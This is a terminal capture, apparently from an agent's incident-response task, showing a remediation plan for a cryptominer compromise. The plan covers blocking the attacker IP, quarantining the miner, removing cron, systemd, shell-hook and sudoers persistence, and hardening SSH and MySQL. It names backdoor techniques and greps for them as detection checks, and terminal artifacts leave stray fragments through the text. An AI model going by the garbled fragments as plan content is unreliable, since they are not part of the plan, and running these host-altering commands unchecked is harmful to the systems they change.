+[?2004lr[?2004h> ## Reconciled Change Ticket CHG-3182
+[?2004l[?2004h> 
+[?2004l:[?2004h> | # | Action | Target | Status | Verification Command & Citation |
+[?2004l[?2004h> |---|--------|--------|--------|----------------------------------|
+[?2004l[?2004h> | 1 | Block attacker origin IP inbound | IP `198.51.100.78` | OPEN | `iptables -L INPUT -v -n | grep 198.51.100.78` (`/disk/var/log/secure`, `/sas/cti/advisory.txt`) |
+[?2004l[?2004h> | 2 | Terminate cryptominer process & quarantine binary | `/tmp/.X11-unix/.xorg` | OPEN | `pkill -f .xorg && mkdir -p /quarantine && mv /tmp/.X11-unix/.xorg /quarantine/` (`/disk/tmp/.X11-unix/.xorg`, `/sas/alerts.json`) |
+[?2004l[?2004h> | 3 | Remove cron persistence | `/var/spool/cron/root` | OPEN | `crontab -l -u root` (verify malicious curl entry removed) (`/disk/var/spool/cron/root`, `/sas/alerts.json`) |
+[?2004l[?2004h> | 4 | Remove systemd persistence unit | `/etc/systemd/system/system-update-helper.service` | OPEN | `systemctl status system-update-helper` (disabled & stopped) (`/disk/etc/systemd/system/system-update-helper.service`, `/sas/alerts.json`) |
+[?2004l[?2004h> | 5 | Remove shell-init persistence | `/root/.bashrc` | OPEN | `grep -i PROMPT_COMMAND /root/.bashrc` (verify clear) (`/disk/root/.bashrc`) |
+[?2004l[?2004h> | 6 | Remove NOPASSWD sudo backdoor | `/etc/sudoers.d/devops` | OPEN | `ls -la /etc/sudoers.d/devops` (file removed/archived) (`/disk/etc/sudoers.d/devops`) | M[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K|
+[?2004l[?2004h> | 7 | Rotate credentials for root & devops | Account Passwords | OPEN | `passwd -S root && passwd -S devops` (credentials reset) (`/disk/etc/passwd`, `/disk/home/devops/.bash_history`) |
+[?2004l_history`.
+
+#### [?2004h> | 8 | Hardening SSH daemon configuration | `/etc/ssh/sshd_config` | OPEN | `sshd -T | grep -E 'permitrootlogin|passwordauthentication'` (`/disk/etc/ssh/sshd_config`, `/sas/baseline.json`) |
+[?2004l[?2004h> | 9 | Hardening MySQL daemon network binding | `/etc/my.cnf` | OPEN | `ss -tulpn | grep 3306` (verify bound to `127.0.0.1`) (`/disk/etc/my.cnf`, `/sas/baseline.json`) |
+[?2004l[?2004h> | 10 | Restore log auditing & remote log streaming | `/etc/rsyslog.conf` | OPEN | `systemctl status rsyslog` (`/disk/var/log/secure`) |
+[?2004l[?2004h> 
+[?2004l[?2004h> ---
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Execution Phases & Verifiable Instructions
+[?2004lita[?2004h> 
+[?2004l[?2004h> ### Phase 1: Immediate Containment
+[?2004lshd_config`,[?2004h> 
+[?2004l [?2004h> #### Step 1.1: Network Containment (Block Attacker IP)
+[?2004lQL [?2004h> - **Objective**: Prevent further external command execution or C2 communication.
+[?2004l[?2004h> - **Action**: Add iptables drop rule for attacker IP `198.51.100.78`.
+[?2004lface[?2004h>   ```bash
+[?2004l[?2004h>   iptables -I INPUT -s 198.51.100.78 -j DROP
+[?2004l[?2004h>   iptables -I OUTPUT -d 198.51.100.78 -j DROP
+[?2004l[?2004h>   ```
+[?2004lqld
+  ```
+[?2004h> - **Verification**: `iptables -L -n -v | grep 198.51.100.78`
+[?2004l[?2004h> - **Citation**: `/disk/var/log/secure`, `/sas/cti/advisory.txt`.
+[?2004ls[?2004h> 
+[?2004l[?2004h> #### Step 1.2: Process Termination & Malware Quarantine
+[?2004lti[?2004h> - **Objective**: Stop resource exhaustion and isolate the malware sample.
+[?2004l`/tmp` or[?2004h> - **Action**: Create quarantine directory, kill miner process, and relocate the binary.
+[?2004l[?2004h>   ```bash
+[?2004l[?2004h>   mkdir -m 700 /root/quarantine_
+[?2004l scripts (`crontab -l`)
+- [ ] Ver[?2004h>   pkill -9 -f "/tmp/.X11-unix/.xorg"
+[?2004l[?2004h>   mv /tmp/.X11-unix/.xorg /root/quarantine_/xorg.bin.quarantine
+[?2004l[ ] Ve[?2004h>   chmod 000 /root/quarantine_/xorg.bin.quarantine
+[?2004l[?2004h>   ```
+[?2004l[?2004h> - **Verification**: `pgrep -f .xorg` (should return empty) and `ls -la /root/quarantine_`
+[?2004l[?2004h> - **Citation**: `/disk/tmp/.X11-unix/.xorg`, `/sas/alerts.json` (`ALERT-01`, `ALERT-02`).
+[?2004l[?2004h> 
+[?2004lS[?2004h> ---
+[?2004lD /[?2004h> 
+[?2004l[?2004h> ### Phase 2: Persistence Eradication
+[?2004l[?2004h> 
+[?2004l [?2004h> #### Step 2.1: Eradicate Cron Persistence
+[?2004l[?2004h> - **Objective**: Remove automated re-dropper cron entry.
+[?2004l[?2004h> - **Action**: Backup current crontab and remove malicious root crontab entry.
+[?2004l[?2004h>   ```bash
+[?2004l[?2004h>   cp /var/spool/cron/root /root/quarantine_/cron_root.bak
+[?2004l[?2004h>   sed -i '/198.51.100.78/d' /var/spool/cron/root
+[?2004l[?2004h>   ```
+[?2004l[?2004h> - **Verification**: `crontab -l -u root`
+[?2004l[?2004h> - **Citation**: `/disk/var/spool/cron/root`, `/sas/alerts.json` (`ALERT-05`).
+[?2004l[?2004h> 
+[?2004l[?2004h> #### Step 2.2: Eradicate Systemd Service Persistence
+[?2004l[?2004h> - **Objective**: Disable persistent malicious systemd service.
+[?2004l[?2004h> - **Action**: Stop, disable, quarantine, and reload systemd daemon.
+[?2004l[?2004h>   ```bash
+[?2004l[?2004h>   systemctl stop system-update-helper.service || true
+[?2004l[?2004h>   systemctl disable system-update-helper.service || true
+[?2004l[?2004h>   mv /etc/systemd/system/system-update-helper.service /root/quarantine_/system-update-helper.service.bak
+[?2004l[?2004h>   systemctl daemon-reload
+[?2004l[?2004h>   systemctl reset-failed
+[?2004l[?2004h>   ```
+[?2004l[?2004h> - **Verification**: `systemctl status system-update-helper.service` (returns inactive/not-found)
+[?2004l[?2004h> - **Citation**: `/disk/etc/systemd/system/system-update-helper.service`, `/sas/alerts.json` (`ALERT-06`).
+[?2004l[?2004h> 
+[?2004l[?2004h> #### Step 2.3: Eradicate Shell Initialization Persistence
+[?2004l[?2004h> - **Objective**: Remove malicious shell hook in root account.
+[?2004l[?2004h> - **Action**: Backup `/root/.bashrc` and remove `PROMPT_COMMAND` beaconing line.
+[?2004l[?2004h>   ```bash
+[?2004l[?2004h>   cp /root/.bashrc /root/quarantine_/bashrc.bak
+[?2004l[?2004h>   sed -i '/PROMPT_COMMAND/d' /root/.bashrc
+[?2004l[?2004h>   ```
+[?2004l[?2004h> - **Verification**: `grep -i PROMPT_COMMAND /root/.bashrc` (returns empty)
+[?2004l[?2004h> - **Citation**: `/disk/root/.bashrc`.
+[?2004l[?2004h> 
+[?2004l[?2004h> #### Step 2.4: Eradicate Privileged Backdoor (Sudoers)
+[?2004l[?2004h> - **Objective**: Remove unauthenticated root access for `devops` user.
+[?2004l[?2004h> - **Action**: Quarantine `/etc/sudoers.d/devops` backdoor file.
+[?2004l[?2004h>   ```bash
+[?2004l[?2004h>   mv /etc/sudoers.d/devops /root/quarantine_/devops_sudoers.bak
+[?2004l[?2004h>   ```
+[?2004l[?2004h> - **Verification**: `sudo -l -U devops` (verify `NOPASSWD: ALL` is no longer granted)
+[?2004l[?2004h> - **Citation**: `/disk/etc/sudoers.d/devops`.
+[?2004l[?2004h> 
+[?2004l[?2004h> ---
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Phase 3: System Hardening & Recovery
+[?2004l[?2004h> 
+[?2004l[?2004h> #### Step 3.1: Account Credential Rotation & Session Invalidation
+[?2004l[?2004h> - **Objective**: Revoke compromised credentials and terminate unauthorized sessions.
+[?2004l[?2004h> - **Action**: Reset passwords for `root` and `devops`, kill active sessions.
+[?2004l[?2004h>   ```bash
+[?2004l[?2004h>   passwd -l root
+[?2004l[?2004h>   openssl rand -base64 24 | passwd --stdin devops
+[?2004l[?2004h>   pkill -u devops
+[?2004l[?2004h>   ```
+[?2004l[?2004h> - **Verification**: `passwd -S root` and `passwd -S devops`
+[?2004l[?2004h> - **Citation**: `/disk/etc/passwd`, `/disk/home/devops/.bash_history`.
+[?2004l[?2004h> 
+[?2004l[?2004h> #### Step 3.2: SSH Server Hardening
+[?2004l[?2004h> - **Objective**: Prevent password brute-forcing and unauthorized root login.
+[?2004l[?2004h> - **Action**: Update `/etc/ssh/sshd_config` to enforce secure baseline settings.
+[?2004l[?2004h>   ```bash
+[?2004l[?2004h>   sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
+[?2004l[?2004h>   sed -i 's/^PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
+[?2004l[?2004h>   systemctl restart sshd
+[?2004l[?2004h>   ```
+[?2004l[?2004h> - **Verification**: `sshd -T | grep -E 'permitrootlogin|passwordauthentication'` (should show `permitrootlogin no` and `passwordauthentication no`).
+[?2004l[?2004h> - **Citation**: `/disk/etc/ssh/sshd_config`, `/sas/baseline.json` (`CHK-04`).
+[?2004l[?2004h> 
+[?2004l[?2004h> #### Step 3.3: MySQL Server Hardening
+[?2004l[?2004h> - **Objective**: Restrict database exposure to local host only.
+[?2004l[?2004h> - **Action**: Modify `/etc/my.cnf` to bind MySQL to loopback interface.
+[?2004l[?2004h>   ```bash
+[?2004l[?2004h>   sed -i '/\[mysqld\]/a bind-address = 127.0.0.1' /etc/my.cnf
+[?2004l[?2004h>   systemctl restart mysqld
+[?2004l[?2004h>   ```
+[?2004l[?2004h> - **Verification**: `ss -tulpn | grep 3306` (should listen on `127.0.0.1:3306`).
+[?2004l[?2004h> - **Citation**: `/disk/etc/my.cnf`, `/sas/baseline.json` (`CHK-09`).
+[?2004l[?2004h> 
+[?2004l[?2004h> ---
+[?2004l[?2004h> 
+[?2004l[?2004h> ### Phase 4: Post-Remediation Verification Checklist
+[?2004l[?2004h> - [ ] Verify no processes running from `/tmp` or hidden directories (`ps aux | grep tmp`)
+[?2004l[?2004h> - [ ] Verify root crontab is clear of untrusted external scripts (`crontab -l`)
+[?2004l[?2004h> - [ ] Verify no custom enabled systemd services persist (`systemctl list-unit-files --state=enabled`)
+[?2004l[?2004h> - [ ] Verify `/root/.bashrc` and `/etc/bashrc` contain no `PROMPT_COMMAND` hooks (`grep -rn PROMPT_COMMAND /etc/bashrc /root/.bashrc`)
+[?2004l[?2004h> - [ ] Verify `/etc/sudoers` and `/etc/sudoers.d/` contain no unauthorized `NOPASSWD` entries (`grep -rn NOPASSWD /etc/sudoers*`)
+[?2004l[?2004h> - [ ] Verify SSH daemon blocks root logins and password auth (`sshd -T`)
+[?2004l[?2004h> - [ ] Verify MySQL listens on `127.0.0.1` (`ss -tulpn`)
+[?2004l[?2004h> EOF
+[?2004l[?2004hroot@d442ccdcc174:/app# ls -la /app
+[?2004ltotal 40
+drwxr-xr-x 1 root root 4096 Aug 16 16:17 [0m[01;34m.[0m
+drwxr-xr-x 1 root root 4096 Aug 16 16:11 [01;34m..[0m
+-rw-r--r-- 1 root root 4410 Aug 16 16:16 baseline-report.md
+-rw-r--r-- 1 root root 6938 Aug 16 16:16 intrusion-report.md
+-rw-r--r-- 1 root root 4019 Aug 16 16:15 progress.md
+-rw-r--r-- 1 root root 7670 Aug 16 16:17 remediation-plan.md
+-rw-r--r-- 1 root root 2735 Aug 16 16:16 vuln-report.md
+[?2004hroot@d442ccdcc174:/app# 
